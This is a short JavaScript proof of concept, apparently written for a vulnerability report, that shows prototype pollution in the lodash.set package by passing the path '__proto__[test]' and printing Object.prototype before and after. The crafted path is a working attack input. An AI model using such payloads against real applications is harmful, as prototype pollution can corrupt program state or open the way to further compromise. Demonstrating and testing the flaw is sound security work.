const set = require("lodash.set");

console.log("Before calling `set` method, Object.prototype looks like this:", Object.prototype);
set({}, "__proto__[test]", "456");
console.log("After calling `set` method, Object.prototype looks like this:", Object.prototype);

